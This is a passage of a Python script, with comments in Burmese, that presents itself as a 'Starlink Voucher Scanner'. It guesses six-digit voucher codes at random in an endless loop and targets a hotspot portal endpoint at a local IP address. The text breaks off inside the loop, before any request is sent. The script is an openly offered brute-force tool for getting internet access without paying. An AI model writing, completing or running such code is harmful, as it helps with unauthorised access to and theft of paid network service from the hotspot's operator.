import time
import random
import os
import sys
import requests

# အရောင်သတ်မှတ်ချက်များ
RED = '\033[91m'     # မရတဲ့ဟာ (Fail)
GREEN = '\033[92m'   # ရတဲ့ဟာ (Success)
WHITE = '\033[97m'   # လက်ရှိသုံးနေတဲ့ကုဒ်
YELLOW = '\033[93m'
CYAN = '\033[96m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def slow_print(text, delay=0.5):
    print(text)
    sys.stdout.flush()
    time.sleep(delay)

def clear_screen():
    os.system('clear')

def start_brute_force():
    clear_screen()
    print(f"{CYAN}[+] Starlink Voucher Scanner Active{END}")
    print(f"{CYAN}[+] Range: 000000 - 999999{END}")
    print(f"{YELLOW}[!] Scanning in progress...{END}\n")
    
    while True:
        # 0 မှ 999999 အထိ ကျပန်း Code ထုတ်ခြင်း
        code = str(random.randint(0, 999999)).zfill(6)
        
        # လက်ရှိစမ်းသပ်နေတဲ့ Code ကို အဖြူရောင်နဲ့ပြ
